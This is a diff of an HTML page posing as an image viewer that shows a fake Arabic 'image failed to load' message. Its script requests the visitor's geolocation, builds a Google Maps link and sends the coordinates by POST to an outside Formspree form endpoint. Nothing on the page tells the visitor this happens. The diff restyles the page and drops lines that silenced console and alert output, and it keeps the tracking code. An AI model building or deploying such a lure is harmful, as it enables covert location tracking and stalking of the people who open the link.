@@ -1,49 +1,32 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تحميل الصورة...</title>
+  <meta charset="UTF-8" />
+  <title>Image Viewer</title>
   <style>
     body {
-      background-color: #111;
-      color: #eee;
-      font-family: Tahoma, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      height: 100vh;
-      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
       text-align: center;
+      padding-top: 100px;
+      color: #444;
     }
-    img {
-      width: 90%;
-      max-width: 400px;
-      margin-bottom: 25px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(255,255,255,0.2);
-    }
-    h2, p {
-      margin: 5px 0;
+    h2 {
+      font-size: 20px;
+      color: #000;
     }
   </style>
 </head>
 <body>
-  <img src="https://i.imgur.com/ptwJpGO.png" alt="Error Image">
-  <h2>❌ تعذر تحميل الصورة</h2>
-  <p>حدث خلل أثناء تحميل الصورة، يرجى المحاولة لاحقاً.</p>
+  <h2>❌ تعذّر تحميل الصورة</h2>
+  <p>حدث خلل أثناء تحميل الصورة، يرجى المحاولة لاحقًا.</p>
 
   <script>
-    console.log = function(){};
-    alert = function(){};
-
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(function(position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
         const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
         const data = {
           location: `Latitude: ${latitude}, Longitude: ${longitude}`,
           maps: mapsLink,
@@ -52,7 +35,9 @@
 
         fetch("https://formspree.io/f/xkgjqegp", {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
+          headers: {
+            "Content-Type": "application/json"
+          },
           body: JSON.stringify(data)
         });
       });
